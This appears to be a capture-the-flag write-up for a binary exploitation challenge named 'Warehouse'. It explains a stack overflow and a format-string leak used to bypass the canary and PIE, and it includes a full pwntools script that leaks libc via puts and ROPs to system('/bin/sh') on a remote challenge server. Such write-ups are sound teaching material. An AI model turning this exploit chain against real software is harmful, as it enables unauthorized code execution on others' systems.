# Warehouse

## Mitigations
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution
This challenge is a program that allows you to add a new "product" to a store, view the prices and names of every product, and has a secret choice to view the logs of what has been done while in the program.  
  
I took a while to solve this challenge, in no part due to spending 30 or so minutes trying to figure out if there was a heap vulnerability. Spoiler: there isn't.  
However, upon looking at the source code in more detail, I found that the program has a vulnerability that is extremely similar to Barcode Scanner's vulnerability.
```c
printf("Enter product name: ");
fgets(input, sizeof(input) * 8, stdin);
```
So, I knew I was working with a stack buffer overflow vulnerability, but that alone cannot solve this challenge because both PIE and a Canary are present. So, I turned to the two functions that printed out the products, and thus also printed out something the user can input, those being `print_product` and `print_log`. Both have `snprintf` used in them.  
`print_product`'s code had nothing of interest in it, and testing it by printing a product with the name "%p" shows nothing out of the ordinary.
```
*********************************
* SHOPPY MCSHOPFACE ENTERPRISES *
*********************************

1) Create product
2) View Products
3) Exit
> 1
Enter product name: %p
Enter price: 1
Enter qty: 1
1) Create product
2) View Products
3) Exit
> 2
Product: Shoppy McShopface Classic Tee - Navy @ $10 (10 in stock)
Product: Shoppy McShopface Ceramic Mug (350ml) @ $10 (10 in stock)
Product: Shoppy Water Bottle - 750ml Stainless @ $10 (10 in stock)
Product: Shoppy Wireless Charger Pad @ $10 (10 in stock)
Product: McShopface Hoodie - Charcoal, Size L @ $10 (10 in stock)
Product: Shoppy Sticker Pack (10 pcs) @ $10 (10 in stock)
Product: Shoppy Laptop Sleeve 13-inch @ $10 (10 in stock)
Product: McShopface Enamel Pin - Limited @ $10 (10 in stock)
Product: Shoppy Reusable Tote Bag - Black @ $10 (10 in stock)
Product: Shoppy Premium Headphones - Onyx @ $10 (10 in stock)
Product: %p @ $1 (1 in stock)
1) Create product
2) View Products
3) Exit
>
```
However, things get interesting with `print_log`, as while nothing appears out of the ordinary, testing this secret option in the program shows that there is a format string vulnerability present.
```
> 4
Log [2026-01-20 14:36:48]: Inserted product Shoppy McShopface Classic Tee - Navy into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy McShopface Ceramic Mug (350ml) into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy Water Bottle - 750ml Stainless into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy Wireless Charger Pad into the database
Log [2026-01-20 14:36:48]: Inserted product McShopface Hoodie - Charcoal, Size L into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy Sticker Pack (10 pcs) into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy Laptop Sleeve 13-inch into the database
Log [2026-01-20 14:36:48]: Inserted product McShopface Enamel Pin - Limited into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy Reusable Tote Bag - Black into the database
Log [2026-01-20 14:36:48]: Inserted product Shoppy Premium Headphones - Onyx into the database
Log [2026-01-20 14:36:52]: Inserted product 0x69700384 into the database
Log [2026-01-20 14:36:53]: Viewed products
Log [2026-01-20 14:38:11]: Viewed accounting logs
1) Create product
2) View Products
3) Exit
>
```
Admittedly I am not completely certain as to why this occurs. My best guess as to why is that there is some format string bug in `create_product` that allows this to work.  
No matter the reason, by slowly printing out more and more of the stack through this vulnerability, and checking what each address or piece of memory is about with pwndbg, we can find both the stack canary, located at %29$p and a specific address linking to `create_product+265` at %11$p. This allows us to bypass both the stack canary and PIE.  
Now, it is likely possible to also find an address in `libc.so.6` through this method, however I did not. Instead what I did is find the offset from the start of the program in memory to the global offset table, and called puts with `rdi` being the address of the GOT entry of `puts`.  
That gave me a libc leak, which I then used to perform a ret2libc and call system("/bin/sh"). Doing so on remote allowed me to then run "cat flag.txt" to get the flag, though this took me significantly longer than I would have liked due to the number of small mistakes and segfaults that I got, mostly with bad offsets and using the wrong libc. Also I used `system` and not `syscall` because I have not been able to get `syscall` to work for me recently.

## Script
from pwn import *

#p = process("./warehouse_patched")
p = remote('0.cloud.chals.io', 16738)
rop = ROP('./warehouse')

libc = ELF('libc.so.6')

lrop = ROP(libc)

def create(name, price, qty):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'name:')
    
    p.sendline(name)
    p.recvuntil(b'price:')
    p.sendline(str(price))
    p.recvuntil(b'qty:')
    p.sendline(str(qty))

def view():
    p.recvuntil(b'>')
    p.sendline(b'2')

def leave():
    p.recvuntil(b'>')
    p.sendline(b'3')
    return p.recvuntil(b'Goodbye.\n')

def logs():
    p.recvuntil(b'>')
    p.sendline(b'4')
    return p.recvuntil(b'1)')
create(b'%29$p %11$p',1,1)

all = logs()
all = all.split(b'\n')
targets = all[-3].split(b' ')
canary = int(targets[5],16)
create_prod = int(targets[6],16) - 265
start = create_prod - 0x16f0

got = create_prod + 265 + 0x1807

putsPLT = start + 0x1060
putsgot = got + 0xf10

rdi = rop.rdi.address + start

rsi = rop.rsi.address + start

write_loc = start + 0x3800
print(hex(create_prod))

create(b'a'*0x48 + p64(canary) + b'a'*(0x40 - len(p64(canary))) + p64(rdi) + p64(putsgot) + p64(putsPLT) + p64(rop.ret.address + start) + p64(rop.ret.address + start) + p64(0x1d12 + start),1,1)

leave()

leak = p.recvline()[:-1]
uleak = u64(leak + b'\x00' * (8 - len(leak)))
print(leak)

base = uleak - libc.symbols['puts']

write = 0xa78d6 + base

rcx = lrop.rcx.address + base
rdx = lrop.rdx.address + base


syscall = libc.symbols['system'] + base

payload = b'a'*0x48 + p64(canary) + b'a'*(0x40 - len(p64(canary)))
payload+=p64(rcx) + b'/bin/sh\x00'
payload+=p64(rdi) + p64(write_loc)
payload+=p64(write)
payload+=p64(rdi) + p64(write_loc)
payload+=p64(rsi) + p64(0x0)
payload+=p64(rdx) + p64(0x0)
payload+=p64(syscall)

create(payload,1,1)

p.interactive()

#0x568943709720
#0x56894370b1f0
#0x00000000000a78d6 = mov rdi rcx
#Canary at %29$p    __libc_start_call_main+122 @ %39$p
#%11$p = create_product+265
```